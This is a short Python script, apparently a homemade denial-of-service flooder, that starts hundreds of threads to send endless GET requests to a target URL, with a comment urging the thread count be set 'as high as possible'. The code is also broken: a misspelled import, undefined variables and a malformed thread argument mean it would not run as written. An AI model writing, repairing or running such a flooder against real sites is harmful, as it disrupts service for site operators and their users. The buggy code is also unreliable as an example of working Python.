import reqeusts as r
import threading as t

def dos_site():
  while True:
    try:
      r.get(url)
    except:
      print('error getting page')


if __name__ == "__main__":
  target_url = ' ' # put url
  num_threads = 900 # put as high as possible but try to not get it laggy!

  for _ in range(num_range):
    t.Thread(target=dos_site, args=(target_url)).start()


